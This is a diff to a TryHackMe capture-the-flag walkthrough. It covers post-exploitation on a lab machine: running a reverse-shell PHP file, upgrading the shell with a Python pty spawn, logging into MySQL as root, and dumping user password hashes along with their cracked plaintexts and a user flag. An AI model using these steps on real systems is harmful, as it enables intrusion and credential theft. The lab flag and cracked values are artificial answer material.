@@ -85,3 +85,41 @@ php7.2 /dev/shm/revshell.php
 
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6bda7e47-ba46-4fd4-90b5-8ea9df271f84)
 
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f5f6cb2a-3386-47db-a151-e040f90fcaa9)
+
+```
+mysql -u root -p
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/dbef2940-7640-43db-830f-da070cfcfeea)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/71e7fe1c-eabd-4a92-9727-c1e12d2d3fbb)
+
+
+| id | firstname | lastname | username  | password                         |
+| - | - | - | - | - |
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ff1a766a-566b-4add-ba66-0058124c7b5a)
+
+| Hash | Type | Result |
+| - | - | - |
+| 686216240e5af30df0501e53c789a649	| md5 |	dontaskdonttell |
+| 7e53614ced3640d5de23f111806cc4fd	| md5	| masterpassword |
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/066f4971-662a-4d0e-896e-e80f9d6ed717)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/8ce218a5-be2a-4a17-967e-7e8e84ac6fda)
+
+https://drive.google.com/file/d/1XESxM91W-L3ONBw3rQTR_mrf67mhT3OZ/view?source=post_page-----889274e1aa78--------------------------------
+
+```
+cat local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+```
+
